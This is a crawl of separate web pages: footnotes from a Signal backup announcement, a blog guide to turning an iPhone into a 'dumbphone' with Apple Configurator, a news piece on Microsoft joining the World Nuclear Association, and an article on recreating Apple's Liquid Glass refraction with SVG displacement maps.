        &lt;p&gt;Media comprises things like photos, videos, GIFs, files, and any attachments. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The storage size limit for paid backups is 100 GB. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Please note that prices are subject to change in the future. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;This key is different from your Signal PIN, which serves different purposes. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Another example: We have also taken extra steps to protect media by encrypting the already-encrypted files a second time with a key unique to your backup and adding padding to obscure their true size. This prevents malicious actors from comparing encrypted files to identify users who are in the same groups, in the unlikely instance that they gain access to the backup files. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;For instance, a catastrophic failure could render the most recent daily backup archive unrecoverable until the next backup cycle completes (which should occur within one day). While we believe such data loss is highly unlikely, this approach ensures that your message history remains protected against even the most sophisticated threats while smoothly recovering within 24 hours. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Our open-source storage management software is available at https://github.com/signalapp/storage-manager. ↩&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;

    &lt;p&gt;Compared to when I started I’m saving about 2 hours of screen time a day. If I kept this up for a month I promised to write a post about this setup. It’s now two months so here’s my post. What follows is a backstory, observations, and a how-to-guide.&lt;/p&gt;
    &lt;p&gt;To get straight to the how-to-guide, click here.&lt;/p&gt;
    &lt;p&gt;It’s common to rack up 4 hours or more of screen time a day on your phone. Here’s one way to see the cost of that: every 20 years, you lose 5 years of your waking time looking at your phone.&lt;/p&gt;
    &lt;p&gt;This is what had me dreaming about the 2000s and old Nokia phones. But I couldn’t just go back to Nokia. My iPhone gave me Google Maps, Spotify, Uber and Waymo, Kindle and Audible, ChatGPT and Claude, Whatsapp, Wallet.&lt;/p&gt;
    &lt;p&gt;There’s real utility to iPhones. If only access to utilities didn’t mean I’d also have access to social media.&lt;/p&gt;
    &lt;p&gt;I often regretted my time on Twitter and Instagram. It would interrupt my flow states at work and detract from quality time with the people I loved. Even alone time suffered: instead of solitude I found myself checking for notifications. [1]&lt;/p&gt;
    &lt;p&gt;I tried and failed to fix this problem three times. Let me enumerate:&lt;/p&gt;
    &lt;p&gt;I tried self-control but I found myself outmatched. On the surface the solution feels simple: why not just stop using distracting apps? For me using self-control here was like a hunter-gatherer using a club in open battle with a nuclear society. Social media companies spent centuries of human effort figuring out ways to get me to check my phone. If I wanted to win, I would need to use guerrilla methods.&lt;/p&gt;
    &lt;p&gt;I tried Screen Time but it was too easy to ignore. Apple comes with Screen Time. You can set limits, but I found them useless. Once a limit runs out all you need to unlock your distracting app is to press a button. Do this a few times and you no longer notice the button.&lt;/p&gt;
    &lt;p&gt;I tried switching phones, but couldn’t let go of the long-tail of iPhone apps. There are lots of interesting dumb phones out there. There’s some with e-ink screens that are really cool. But they only have a few apps. There was always some app that I missed. Even with recent Android-based dumbphones, there were still apps that were only available on the iPhone (I am looking at you Things 3).&lt;/p&gt;
    &lt;p&gt;If only I could keep my iPhone, but choose just the apps and the websites that I wanted.&lt;/p&gt;
    &lt;p&gt;That’s where I discovered Apple Configurator. Apple Configurator lets organizations deploy specific restrictions onto iPhones. This is what lets Apple Stores restrict the iPhones on display, so you can’t change their wallpaper to something humorous.&lt;/p&gt;
    &lt;p&gt;Configurator is meant for businesses, but nothing stops us from using it personally. And it’s free too!&lt;/p&gt;
    &lt;p&gt;I found three advantages to using Configurator.&lt;/p&gt;
    &lt;p&gt;The first is that there is real friction to making changes. In order to adjust restrictions, you have to physically connect your iPhone to your laptop and open up a kludgy piece of software. This is cumbersome enough that if you have enough willpower to go through with it, you’ll be level-headed enough to not want too. [2]&lt;/p&gt;
    &lt;p&gt;The second is that you can actually disable the App Store! This is a marvelous win. Having an App Store in your home screen is like being dieter with a pastry shop in your kitchen. It’s not a good idea. So no more App Store. And combine that with content filters for websites, and you can really lock down your phone. When you are at your weakest, there’s effectively no way to hack around the restrictions.&lt;/p&gt;
    &lt;p&gt;And the final win, it’s still an iPhone. This means you can make a dumbphone that fits your needs exactly. There are some apps that sound distracting on the surface, that I just needed plain and simple. For example, my startup uses Discord to talk to users; I want to have it. I want the GitHub app. I want Things3 and Waymo. I want to access specific websites. I can set it all up so my phone is exactly the utility I need it to be.&lt;/p&gt;
    &lt;p&gt;If you’re getting excited, let me prepare you with two cons.&lt;/p&gt;
    &lt;p&gt;The first is that you have to factory reset your iPhone. You can only set up Apple Configurator with a completely reset phone. This means the initial setup is annoying and will take you a few hours. But perhaps this a good thing too. If you go through this trouble, you’ll be even more motivated to stick with your choices.&lt;/p&gt;
    &lt;p&gt;The second is that getting the right setup takes a few weeks, and you may need to rely on others. When you start out you may forget an app or two (or a lot more). For example, I went to my gym the day after I set my restrictions, only to remember that they have a special iPhone to check in. You’ll have lots of little frictions like this. As you do, you’ll improve your configuration so this happens less. It’ll get better but there will still be a long-tail. Maybe you’re at a restaurant and they need you to open a website for example. You may end up having to bug some people around you for their phone. It can be annoying but I haven’t found this to be too troublesome.&lt;/p&gt;
    &lt;p&gt;So, it’s 2 months in. Here’s my experience so far:&lt;/p&gt;
    &lt;p&gt;It feels great. My phone feels like a utility. I think this is the same kind of change in feeling I would have had if I shifted from eating junk food to healthy food. My phone used to have this gravity: like invariably my attention would shift towards it. Now it just feels like a very useful rock.&lt;/p&gt;
    &lt;p&gt;I found ChatGPT and Claude critically useful. Whenever I need some information, I can just ask my LLM, and it can give me a distraction free summary. It helps the long-tail of weird situations too: for example if someone asks me to take a look at a website, I can ask my LLM to scrape it and summarize the details for me. It’s pretty hard to get distracted this way.&lt;/p&gt;
    &lt;p&gt;And in the the last 2 months I have not felt the desire to remove the restrictions. This wasn’t the case with any previous setup I tried. I think it’s because the friction feels just right. I feel like I can control exactly how my phone should work; there’s just a day or two delay. The delay keeps me level-headed.&lt;/p&gt;
    &lt;p&gt;So far the only real unsolved issue I have are related to “semi-important” apps. Consider email. I still need to have access to email, and I want to have notifications enabled so I don’t miss something truly important. But 90% of the emails I get aren’t important.&lt;/p&gt;
    &lt;p&gt;I am not sure what the solution is to these kind of apps. Maybe I can find a special mail app, that only shows you important emails. If I had something like this I think I would just be over the moon with this setup. [3]&lt;/p&gt;
    &lt;p&gt;I used to spend about 4 hours a day on my phone. I’m now down to about 2 hours a day. Looking at the stats, it’s 1 hour of reasonably productive apps, mixed with communication apps (my family lives in a different country, so I make long calls). Overall I don’t regret this time.&lt;/p&gt;
    &lt;p&gt;If you want to do this yourself, it’s going to take a 2-hour initial commitment, and about 2 weeks of tweaks to get everything set up just right.&lt;/p&gt;
    &lt;p&gt;In the first 2 hours, you will factory reset your phone, and set up Apple Configurator. As those two weeks progress, you’ll tweak your restrictions so you have just the apps and the websites you actually need.&lt;/p&gt;
    &lt;p&gt;Okay, let’s get into those first 2 hours!&lt;/p&gt;
    &lt;p&gt;Time to reset your iPhone. Go to Settings → General → Transfer or Reset iPhone → Erase all content and settings.&lt;/p&gt;
    &lt;p&gt;This is the first, and the scariest step. Do it, and you are on the journey 🫡&lt;/p&gt;
    &lt;p&gt;Now head on over to the Apple and install Apple Configurator. Open the app and click ‘Get Started’&lt;/p&gt;
    &lt;p&gt;We can then prepare your device for configurator. Connect your iPhone to your laptop. You should see it show up in Configurator. Once you do, Right click and click “Prepare”:&lt;/p&gt;
    &lt;p&gt;Select “Manual Configuration”, with “Supervise devices” like so:&lt;/p&gt;
    &lt;p&gt;You can skip “Sign in to Apple School Manager or Apple Business Manager”. Just press Next.&lt;/p&gt;
    &lt;p&gt;Now enter an “Organization”. Since this is just for yourself, you are an organization of one : ). I use my name:&lt;/p&gt;
    &lt;p&gt;In “Configure iOS Setup Assistant”, select “Don’t show any of these steps”&lt;/p&gt;
    &lt;p&gt;Click “Prepare”&lt;/p&gt;
    &lt;p&gt;Aand you’re ready to go!&lt;/p&gt;
    &lt;p&gt;Your phone is now ready for Configurator.&lt;/p&gt;
    &lt;p&gt;Before we start adding restrictions, let’s set your phone up. Go through Apple’s setup, and make sure you do not restore your iPhone from an iCloud backup. This will undo the supervision stuff we just did.&lt;/p&gt;
    &lt;p&gt;Once you set things up, go ahead and install all the apps that you’ll need. As a way to jog your memory, here are the apps that I ended up installing:&lt;/p&gt;

    &lt;p&gt;Click ‘File’ → ‘New Profile’.&lt;/p&gt;
    &lt;p&gt;You’ll make three changes&lt;/p&gt;
    &lt;p&gt;Under ‘General’: For ‘Security’ and ‘Automatically Remove Profile’, set ‘Never’:&lt;/p&gt;
    &lt;p&gt;Head on over to ‘Content Filter’, and click ‘Configure’. For ‘Filter Type’, select “Specific Websites only”:&lt;/p&gt;

    &lt;p&gt;‘Restrictions’ are where we will disable the App Store. Click on ‘Restrictions’ → ‘Configure’.&lt;/p&gt;
    &lt;p&gt;Keep everything as it is, just uncheck ‘Allow Installing Apps’&lt;/p&gt;
    &lt;p&gt;With that, save your profile. Once we install this profile on your phone…you’re done.&lt;/p&gt;
    &lt;p&gt;So let’s install this profile to your iPhone.&lt;/p&gt;
    &lt;p&gt;Right click your phone on Configurator, hit ‘Add’ → ‘Profiles’, pick your profile, and you’re ready to go!&lt;/p&gt;
    &lt;p&gt;When you load your phone, you should no longer see an App Store!&lt;/p&gt;
    &lt;p&gt;After a while you may realize you need to install some new apps. When you want to do that, connect your phone, ‘Right click’ → ‘Remove’ → ‘Profile’&lt;/p&gt;
    &lt;p&gt;Once you remove your profile, you’re back to a restrictionless world. Make all the changes you need, and then add it back.&lt;/p&gt;
    &lt;p&gt;And with that, you have an iPhone dumbphone! I hope it’s as useful for you as it has been for me.&lt;/p&gt;
    &lt;p&gt;If you follow the instructions and have any issues or changes to make, please send me an email.&lt;/p&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;Microsoft joins World Nuclear Association as it doubles down on small modular reactors and fusion energy&lt;/head&gt;
    &lt;p&gt;Nuclear energy is stepping into big tech’s future electricity strategies&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Microsoft is chasing carbon-free energy while data demand keeps rising&lt;/item&gt;
      &lt;item&gt;The World Nuclear Association gains unprecedented visibility through Microsoft’s membership&lt;/item&gt;
      &lt;item&gt;Small modular reactors are being framed as digital infrastructure’s next foundation&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Microsoft has officially joined the World Nuclear Association (WNA), making it the first global technology company of its scale to do so.&lt;/p&gt;
    &lt;p&gt;The announcement comes at a time when the nuclear industry is attempting to position itself as a necessary partner for both climate targets and the electricity needs of a rapidly expanding digital economy.&lt;/p&gt;
    &lt;p&gt;For Microsoft, the move signals a deeper commitment to technologies like small modular reactors and fusion energy as part of its long-term carbon-free ambitions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Balancing climate goals with electricity demand&lt;/head&gt;
    &lt;p&gt;Electricity consumption tied to data centers is expected to grow sharply in the next decade, putting pressure on utilities and energy-intensive industries alike.&lt;/p&gt;
    &lt;p&gt;Microsoft’s decision to align with the World Nuclear Association reflects this trend, as while the company already invests heavily in renewable power sources, nuclear energy offers continuous, high-capacity output that wind and solar cannot always provide.&lt;/p&gt;
    &lt;p&gt;The WNA describes Microsoft’s membership as a "game-changing moment," but such claims will likely face scrutiny given the slow pace of nuclear deployment globally.&lt;/p&gt;
    &lt;p&gt;"Microsoft's membership with the Association is a game-changing moment for our industry," said World Nuclear Association Director General Sama Bilbao y León.&lt;/p&gt;
    &lt;p&gt;Sign up to the TechRadar Pro newsletter to get all the top news, opinion, features and guidance your business needs to succeed!&lt;/p&gt;
    &lt;p&gt;"When one of the world's most innovative technology companies recognizes nuclear energy as essential to its carbon-negative future, it sends a powerful signal to markets, policymakers, and industry leaders worldwide. This partnership will accelerate nuclear deployment at the scale needed to meet both climate goals and the growth in energy demand from data centers."&lt;/p&gt;
    &lt;p&gt;Microsoft has already signed long-term agreements designed to secure reliable energy supplies.&lt;/p&gt;
    &lt;p&gt;One of the most notable is a 20-year power purchase agreement with Constellation Energy, intended to restart the Crane Clean Energy Center, the former Three Mile Island Unit 1 facility in the United States.&lt;/p&gt;
    &lt;p&gt;In addition, the company struck one of the earliest commercial deals with fusion energy company Helion.&lt;/p&gt;
    &lt;p&gt;As part of its World Nuclear Association membership, Microsoft is expected to work on areas like advanced nuclear technologies, regulatory efficiency, and supply chain resilience.&lt;/p&gt;
    &lt;p&gt;Small modular reactors and next-generation systems, including potential fusion breakthroughs, are central to this collaboration.&lt;/p&gt;
    &lt;p&gt;Advocates argue that streamlined licensing and stronger global supply chains are critical if nuclear power is to play a larger role in meeting energy demand.&lt;/p&gt;
    &lt;p&gt;Still, the challenges of cost, construction delays, and political opposition remain major barriers.&lt;/p&gt;
    &lt;p&gt;Microsoft’s Energy Technology team, led by Dr. Melissa Lott, will take a leading role in shaping how the company participates in the Association’s initiatives.&lt;/p&gt;
    &lt;p&gt;For the World Nuclear Association, securing a member like Microsoft brings both visibility and legitimacy.&lt;/p&gt;
    &lt;p&gt;For Microsoft, it offers a chance to hedge its energy bets in an uncertain market, but whether this partnership proves transformative depends on the ability of nuclear technologies to deliver results.&lt;/p&gt;
    &lt;p&gt;"Nuclear energy isn't just part of the technology sector’s energy strategy, it's essential to it," said León. "Microsoft joining the Association allows greater collaboration between one of the major energy users and the nuclear industry to address the regulatory, technical, and financial challenges to accelerate nuclear deployment. The global nuclear industry isn’t just generating electricity, it’s energizing technology."&lt;/p&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;Articles /&lt;/head&gt;
    &lt;head rend="h1"&gt;Liquid Glass in the Browser: Refraction with CSS and SVG&lt;/head&gt;
    &lt;head rend="h1"&gt;#Introduction&lt;/head&gt;
    &lt;p&gt;Apple introduced the Liquid Glass effect during WWDC 2025 in June—a stunning UI effect that makes interface elements appear to be made of curved, refractive glass. This article is a hands‑on exploration of how to recreate a similar effect on the web using CSS, SVG displacement maps, and physics-based refraction calculations.&lt;/p&gt;
    &lt;p&gt;Instead of chasing pixel‑perfect parity, we’ll approximate Liquid Glass, recreating the core refraction and a specular highlight, as a focused proof‑of‑concept you can extend.&lt;/p&gt;
    &lt;p&gt;We'll build up the effect from first principles, starting with how light bends when passing through different materials.&lt;/p&gt;
    &lt;p&gt;Chrome‑only demo&lt;/p&gt;
    &lt;p&gt;The interactive demo at the end currently works in Chrome only (due to SVG filters as backdrop‑filter).&lt;/p&gt;
    &lt;p&gt;You can still read the article and interact with the inline simulations in other browsers.&lt;/p&gt;
    &lt;head rend="h1"&gt;#Understanding Refraction&lt;/head&gt;
    &lt;p&gt;Refraction is what happens when light changes direction as it passes from one material to another (like from air into glass). This bending occurs because light travels at different speeds through different materials.&lt;/p&gt;
    &lt;p&gt;The relationship between the incoming and outgoing light angles is described by Snell–Descartes law:&lt;/p&gt;
    &lt;p&gt;In the above interactive diagram, you can see that:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;When , the light ray passes straight through without bending.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;When , the ray bends toward the normal (the imaginary line perpendicular to the surface).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;When , the ray bends away from the normal, and depending on the angle of incidence, it may bend so much that it reflects back into the original medium instead of passing through.&lt;/p&gt;
        &lt;p&gt;This is called Total Internal Reflection&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;When incident ray is orthogonal to the surface, it passes straight through regardless of refractive indices.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;#Limitations in this project&lt;/head&gt;
    &lt;p&gt;To keep things focused we avoid complex branches of behavior by constraining the scenario:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Ambient medium has (air).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Use materials with , and prefer (glass).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Only one refraction event (ignore any later exit / second refraction).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Incident rays are always orthogonal to the background plane (no perspective).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Objects are 2D shapes parallel to the background (no perspective).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;No gap between objects and background plane (only one refraction).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Circle shapes only in this article:&lt;/p&gt;
        &lt;p&gt;Extending to other shapes requires preliminary calculations.&lt;/p&gt;
        &lt;p&gt;Circles let us form rounded rectangles by stretching the middle.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Under these assumptions every ray we manipulate has a well-defined refracted direction via Snell's Law, and we simplify a lot our calculations.&lt;/p&gt;
    &lt;head rend="h1"&gt;#Creating the Glass Surface&lt;/head&gt;
    &lt;p&gt;To create our glass effect, we need to define the shape of our virtual glass surface. Think of this like describing the cross-section of a lens or curved glass panel.&lt;/p&gt;
    &lt;head rend="h2"&gt;#Surface Function&lt;/head&gt;
    &lt;p&gt;Our glass surface is described by a mathematical function that defines how thick the glass is at any point from its edge to the end of the bezel. This surface function takes a value between (at the outer edge) and (end of bezel, start of flat surface) and returns the height of the glass at that point.&lt;/p&gt;
    &lt;p&gt;From the height we can calculate the angle of incidence, which is the angle between the incoming ray and the normal to the surface at that point. The normal is simply the derivative of the height function at that point, rotated by degrees:&lt;/p&gt;
    &lt;head rend="h2"&gt;#Equations&lt;/head&gt;
    &lt;p&gt;For this article, we will use four different height functions to demonstrate the effect of the surface shape on the refraction:&lt;/p&gt;
    &lt;p&gt;Simple circular arc → a spherical dome. Easier than the squircle, but the transition to the flat interior is harsher, producing sharper refraction edges—more noticeable when the shape is stretched away from a true circle.&lt;/p&gt;
    &lt;p&gt;Uses the Squircle Apple favors: a softer flat→curve transition that keeps refraction gradients smooth even when stretched into rectangles—no harsh interior edges. It also makes the bezel appear optically thinner than its physical size because the flatter outer zones bend light less.&lt;/p&gt;
    &lt;p&gt;The concave surface is the complement of the convex function, creating a bowl-like depression. This surface causes light rays to diverge outward, displacing them beyond the glass boundaries.&lt;/p&gt;
    &lt;p&gt;We could make the surface function more complex by adding more parameters, but these four already give a good idea of how the surface shape affects the refraction.&lt;/p&gt;
    &lt;head rend="h2"&gt;#Simulation&lt;/head&gt;
    &lt;p&gt;Now let's see these surface functions in action through interactive ray tracing simulations. The following visualization demonstrates how light rays behave differently as they pass through each surface type, helping us understand the practical implications of our mathematical choices.&lt;/p&gt;
    &lt;p&gt;From the simulation, we can see that concave surfaces push rays outside the glass; convex surfaces keep them inside.&lt;/p&gt;
    &lt;p&gt;We want to avoid outside displacement because it requires sampling background beyond the object. Apple’s Liquid Glass appears to favor convex profiles (except for the Switch component, covered later).&lt;/p&gt;
    &lt;p&gt;The background arrow indicates displacement—how far a ray lands compared to where it would have landed without glass. Color encodes magnitude (longer → more purple).&lt;/p&gt;
    &lt;p&gt;Take a look at symmetry: rays at the same distance from the border share the same displacement magnitude on each side. Compute once, reuse around the bezel/object.&lt;/p&gt;
    &lt;head rend="h1"&gt;#Displacement Vector Field&lt;/head&gt;
    &lt;p&gt;Now that calculated the displacement at a distance from border, let's calculate the displacement vector field for the entire glass surface.&lt;/p&gt;
    &lt;p&gt;The vector field describes at every position on the glass surface how much the light ray is displaced from its original position, and in which direction. In a circle, this displacement is always orthogonal to the border.&lt;/p&gt;
    &lt;head rend="h2"&gt;#Pre-calculating the displacement magnitude&lt;/head&gt;
    &lt;p&gt;Because we saw that this displacement magnitude is symmetric around the bezel, we can pre-calculate it for a range of distances from the border, on a single radius.&lt;/p&gt;
    &lt;p&gt;This allows us to calculate everything in two dimensions once (x and z axis), on one "half-slice" of the object, and we will the rotate these pre-calculated displacements around the z-axis.&lt;/p&gt;
    &lt;p&gt;The actual number of samples we need to do on a radius is of 127 ray simulations, and is determined by the constraints of the SVG Displacement Map resolution. (See next section.)&lt;/p&gt;
    &lt;head rend="h2"&gt;#Normalizing vectors&lt;/head&gt;
    &lt;p&gt;In the above diagram, the arrows are all scaled down for visibility, so they do not overlap. This is normalization, and is also useful from a technical standpoint.&lt;/p&gt;
    &lt;p&gt;To use these vectors in a displacement map, we need to normalize them. Normalization means scaling the vectors so that their maximum magnitude is , which allows us to represent them in a fixed range.&lt;/p&gt;
    &lt;p&gt;So we calculate the maximum displacement magnitude in our pre-calculated array:&lt;/p&gt;
    &lt;p&gt;And we divide each vector's magnitude by this maximum:&lt;/p&gt;
    &lt;p&gt;We store &lt;code&gt;maximumDisplacement&lt;/code&gt; as we will need it to re-scale the displacement map back to the actual magnitudes.&lt;/p&gt;
    &lt;head rend="h1"&gt;#SVG Displacement Map&lt;/head&gt;
    &lt;p&gt;Now we need to translate our mathematical refraction calculations into something the browser can actually render. We'll use SVG displacement maps.&lt;/p&gt;
    &lt;p&gt;A displacement map is simply an image where each pixel's color tells the browser how far it should find the actual pixel value from its current position.&lt;/p&gt;
    &lt;p&gt;SVG's &lt;code&gt;&amp;lt;feDisplacementMap /&amp;gt;&lt;/code&gt; encodes these pixels in a 32 bit RGBA image, where each channel represents a different axis of displacement.&lt;/p&gt;
    &lt;p&gt;It's up to the user to define which channel corresponds to which axis, but it is important to understand the constraint: Because each channel is 8 bits, the displacement is limited to a range of -128 to 127 pixels in each direction. (256 values possible in total). 128 is the neutral value, meaning no displacement.&lt;/p&gt;
    &lt;p&gt;SVG filters can only use images as displacement maps, so we need to convert our displacement vector field into an image format.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;&amp;lt;feDisplacementMap /&amp;gt;&lt;/code&gt; uses the red channel for the X axis and the green channel for the Y axis. The blue and alpha channels are ignored.&lt;/p&gt;
    &lt;head rend="h2"&gt;#Scale&lt;/head&gt;
    &lt;p&gt;The Red (X) and Green (Y) channels are 8‑bit values (0–255). Interpreted without any extra scaling, they map linearly to a normalized displacement in [−1, 1], with 128 as the neutral value (no displacement):&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;scale&lt;/code&gt; attribute of &lt;code&gt;&amp;lt;feDisplacementMap /&amp;gt;&lt;/code&gt; multiplies this normalized amount:&lt;/p&gt;
    &lt;p&gt;Because our vectors are normalized using the maximum possible displacement (in pixels) as the unit, we can reuse that maximum directly as the filter’s &lt;code&gt;scale&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;You can also animate &lt;code&gt;scale&lt;/code&gt; to fade the effect in/out—no need to recompute the map (useful for artistic control even if not physically exact).&lt;/p&gt;
    &lt;head rend="h2"&gt;#Vector to Red-Green values&lt;/head&gt;
    &lt;p&gt;To convert our displacement vector field into a displacement map, we need to convert each vector into a color value. The red channel will represent the X component of the vector, and the green channel will represent the Y component.&lt;/p&gt;
    &lt;p&gt;We currently have polar coordinates (angle and magnitude) for each vector, so we need to convert them to Cartesian coordinates (X and Y) before mapping them to the red and green channels.&lt;/p&gt;
    &lt;p&gt;Because we normalised our vectors already, &lt;code&gt;magnitude&lt;/code&gt; here is between 0 and 1.&lt;/p&gt;
    &lt;p&gt;From here, we just remap the values to the range of 0 to 255 for the red and green channels:&lt;/p&gt;
    &lt;p&gt;After converting every vector in the map to color value, we get an image that can be used as a displacement map in the SVG filter.&lt;/p&gt;
    &lt;head rend="h2"&gt;#Playground&lt;/head&gt;
    &lt;p&gt;This playground applies the SVG displacement filter to a simple scene and lets you tweak surface shape, bezel width, glass thickness, and effect scale. Watch how these inputs change the refraction field, the generated displacement map, and the final rendering.&lt;/p&gt;
    &lt;head rend="h4"&gt;Surface&lt;/head&gt;
    &lt;head rend="h4"&gt;Controls&lt;/head&gt;
    &lt;head rend="h4"&gt;Radius Simulation&lt;/head&gt;
    &lt;head rend="h4"&gt;Displacement Map&lt;/head&gt;
    &lt;head rend="h4"&gt;Radius Displacements&lt;/head&gt;
    &lt;head rend="h4"&gt;Preview&lt;/head&gt;
    &lt;head rend="h1"&gt;#Specular Highlight&lt;/head&gt;
    &lt;p&gt;The final piece of our Liquid Glass effect is the specular highlight—those bright, shiny edges you see on real glass objects when light hits them at certain angles.&lt;/p&gt;
    &lt;p&gt;The way Apple implements it seems to be a simple rim light effect, where the highlight appears around the edges of the glass object, and its intensity varies based on the angle of the surface normal relative to a fixed light direction.&lt;/p&gt;
    &lt;head rend="h1"&gt;#Combining Refraction and Specular Highlight&lt;/head&gt;
    &lt;p&gt;In the final SVG filter, we combine both the displacement map for refraction and the specular highlight effect.&lt;/p&gt;
    &lt;p&gt;Both are loaded as separate &lt;code&gt;&amp;lt;feImage /&amp;gt;&lt;/code&gt; elements, and then combined using &lt;code&gt;&amp;lt;feBlend /&amp;gt;&lt;/code&gt; to overlay the highlight on top of the refracted image.&lt;/p&gt;
    &lt;p&gt;But this part is actually the most "creative" part of the effect, and it's just by tweaking the number of filters, and their parameters, that you can get a variety of different looks.&lt;/p&gt;
    &lt;head rend="h2"&gt;#SVG Filter as &lt;code&gt;backdrop-filter&lt;/code&gt;&lt;/head&gt;
    &lt;p&gt;This is the part where cross-browser compatibility ends. Only Chrome currently supports using SVG filters as &lt;code&gt;backdrop-filter&lt;/code&gt;, which is essential for applying the Liquid Glass effect to UI components:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Note: The backdrop-filter dimensions does not adjust automatically to the element size, so you need to ensure that your filter images fit the size of your elements.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Now that we have all the pieces in place, we can create components that use this effect.&lt;/p&gt;
    &lt;head rend="h1"&gt;#Bringing It All Together: Real UI Components&lt;/head&gt;
    &lt;p&gt;With our refraction math and displacement maps working, let's see how this translates to actual UI components you might use in an application.&lt;/p&gt;
    &lt;p&gt;Chrome‑specific demo&lt;/p&gt;
    &lt;p&gt;Chrome allows using SVG filters as &lt;code&gt;backdrop-filter&lt;/code&gt;, which
isn’t part of the CSS spec.&lt;/p&gt;
    &lt;p&gt;Above, we used regular &lt;code&gt;filter&lt;/code&gt; so it’s viewable in
Safari/Firefox.&lt;/p&gt;
    &lt;p&gt;The next components use &lt;code&gt;backdrop-filter&lt;/code&gt;, so they’re
Chrome‑only.&lt;/p&gt;
    &lt;p&gt;The goal won't be to create real components for production, but just to get a taste of how the effect looks in different UI elements.&lt;/p&gt;
    &lt;head rend="h2"&gt;#Magnifying Glass&lt;/head&gt;
    &lt;p&gt;This component actually uses two displacement maps: one for the refraction on the sides, and one for the zooming, which has a stronger refraction effect.&lt;/p&gt;
    &lt;p&gt;It also plays with shadows and scaling to create a more dynamic, interactive effect.&lt;/p&gt;
    &lt;head rend="h3"&gt;Liquid Glass—Precision Lens&lt;/head&gt;
    &lt;p&gt;Drag the capsule to bend the page. This lens is a compact SVG displacement rig that refracts whatever sits beneath it.&lt;/p&gt;
    &lt;p&gt;The field comes from a rounded bezel profile; pixels are pushed along its gradient, then topped with a subtle specular bloom for depth.&lt;/p&gt;
    &lt;p&gt;Sweep across strong edges—high contrast makes the bend snap.&lt;/p&gt;
    &lt;head rend="h2"&gt;#Searchbox&lt;/head&gt;
    &lt;head rend="h2"&gt;#Switch&lt;/head&gt;
    &lt;p&gt;This uses a lip bezel, which makes the surface convex on the outside and concave in the middle. This makes the center slider zoomed out, while the edges refract the inside.&lt;/p&gt;
    &lt;head rend="h2"&gt;#Slider&lt;/head&gt;
    &lt;p&gt;Slider allows you to see the current level through the glass, while the sides refract the background. It uses a convex bezel.&lt;/p&gt;
    &lt;head rend="h2"&gt;#Music Player&lt;/head&gt;
    &lt;p&gt;This fake music player UI tries to mimic the look of Apple Music’s Liquid Glass panels, using a convex bezel and a subtle specular highlight.&lt;/p&gt;
    &lt;p&gt;It relies on the iTunes Search API to fetch album art and song details.&lt;/p&gt;
    &lt;head rend="h1"&gt;#Conclusion&lt;/head&gt;
    &lt;p&gt;This prototype distills Apple’s Liquid Glass into real‑time refraction plus a simple highlight. It’s flexible, but still Chrome‑bound—only Chromium exposes SVG filters as &lt;code&gt;backdrop-filter&lt;/code&gt;. That said, it’s already viable inside Chromium‑based runtimes like Electron, elsewhere you could fake a softer fallback with layered blur.&lt;/p&gt;
    &lt;p&gt;Treat this strictly as experimental. Dynamic shape/size changes are currently costly because nearly every tweak (besides animating &lt;code&gt;&amp;lt;filter /&amp;gt;&lt;/code&gt; props, like &lt;code&gt;scale&lt;/code&gt;) forces a full displacement map rebuild.&lt;/p&gt;
    &lt;p&gt;The code needs a cleanup pass and perf work before any possible open‑source release.&lt;/p&gt;
    &lt;p&gt;Thanks for reading my first post—I'd genuinely love any feedback, ideas, critiques, or suggestions. If it sparked a thought or you know someone who'd enjoy this kind of deep‑dive, feel free to pass it along.&lt;/p&gt;

